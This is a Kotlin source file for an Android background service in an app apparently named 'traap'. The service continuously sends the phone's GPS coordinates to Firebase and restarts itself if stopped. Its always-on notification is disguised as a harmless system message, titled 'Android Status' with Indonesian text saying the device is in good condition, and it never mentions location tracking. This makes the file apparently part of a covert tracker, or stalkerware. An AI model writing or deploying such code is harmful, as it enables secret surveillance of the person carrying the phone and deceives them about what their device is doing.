package com.comp.traap.service

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.comp.traap.R
import com.comp.traap.data.repository.LocationRepository
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.catch

class LocationService : Service() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var locationRepository: LocationRepository

    private var locationJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        locationRepository = LocationRepository(applicationContext)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> startLocationTracking()
            ACTION_STOP -> stopLocationTracking()
        }
        return START_STICKY
    }

    private fun startLocationTracking() {
        // Check permissions
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) !=
                        PackageManager.PERMISSION_GRANTED
        ) {
            stopSelf()
            return
        }

        // Save service state
        saveServiceState(true)

        // Start foreground service with notification
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Start collecting location updates
        locationJob =
                serviceScope.launch {
                    locationRepository
                            .getLocationUpdates()
                            .catch { e -> android.util.Log.e(TAG, "Location error: ${e.message}") }
                            .collect { locationData ->
                                // Send to Firebase
                                val result = locationRepository.sendLocationToFirebase(locationData)
                                if (result.isSuccess) {
                                    android.util.Log.d(
                                            TAG,
                                            "Location sent: ${locationData.latitude}, ${locationData.longitude}"
                                    )
                                } else {
                                    android.util.Log.e(
                                            TAG,
                                            "Failed to send location: ${result.exceptionOrNull()?.message}"
                                    )
                                }
                            }
                }
    }

    private fun stopLocationTracking() {
        // Save service state
        saveServiceState(false)

        locationJob?.cancel()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun createNotification(): Notification {
        // Empty PendingIntent - notification won't open any activity
        return NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Android Status")
                .setContentText("Dalam keadaan baik")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
    }

    private fun saveServiceState(isRunning: Boolean) {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putBoolean(KEY_SERVICE_RUNNING, isRunning).apply()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel =
                    NotificationChannel(
                                    CHANNEL_ID,
                                    "Location Tracking",
                                    NotificationManager.IMPORTANCE_LOW
                            )
                            .apply {
                                description = "Notification"
                                setShowBadge(false)
                            }

            val notificationManager =
                    getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        locationJob?.cancel()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG = "LocationService"
        const val CHANNEL_ID = "location_tracking_channel"
        const val NOTIFICATION_ID = 1001
        const val ACTION_START = "ACTION_START_LOCATION_SERVICE"
        const val ACTION_STOP = "ACTION_STOP_LOCATION_SERVICE"

        private const val PREFS_NAME = "location_service_prefs"
        private const val KEY_SERVICE_RUNNING = "is_service_running"

        fun startService(context: Context) {
            val intent =
                    Intent(context, LocationService::class.java).apply { action = ACTION_START }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stopService(context: Context) {
            val intent = Intent(context, LocationService::class.java).apply { action = ACTION_STOP }
            context.startService(intent)
        }

        fun isServiceRunning(context: Context): Boolean {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            return prefs.getBoolean(KEY_SERVICE_RUNNING, false)
        }
    }
}
